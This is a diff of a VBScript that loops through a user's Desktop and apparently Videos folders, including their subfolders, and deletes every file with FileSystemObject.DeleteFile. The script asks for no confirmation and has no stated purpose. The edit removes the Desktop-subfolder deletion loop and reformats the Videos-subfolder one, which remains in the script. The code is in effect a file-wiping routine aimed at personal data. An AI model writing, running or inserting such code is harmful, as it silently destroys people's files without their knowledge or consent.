@@ -13,17 +13,8 @@ For Each objFile In objFolder.Files
     objFSO.DeleteFile(objFile)
 Next
 
-' Loop through each subfolder in the Desktop folder
-For Each objSubFolder In objFolder.SubFolders
-    ' Loop through each file in the subfolder and delete it
-    For Each objFile In objSubFolder.Files
-        objFSO.DeleteFile(objFile)
-    Next
-Next
-
 ' Release FileSystemObject resources
 Set objFile = Nothing
-Set objSubFolder = Nothing
 Set objFolder = Nothing
 Set objFSO = Nothing
 
@@ -100,10 +91,11 @@ Set objFolder = objFSO.GetFolder(WScript.CreateObject("WScript.Shell").SpecialFo
 For Each objFile In objFolder.Files
     objFSO.DeleteFile(objFile)
 Next
+
 ' Loop through each subfolder in the videos folder
 For Each objSubFolder In objFolder.SubFolders
-' Loop through each file in the subfolder and delete it
-For Each objFile In objSubFolder.Files
+    ' Loop through each file in the subfolder and delete it
+    For Each objFile In objSubFolder.Files
 objFSO.DeleteFile(objFile)
 Next
 Next
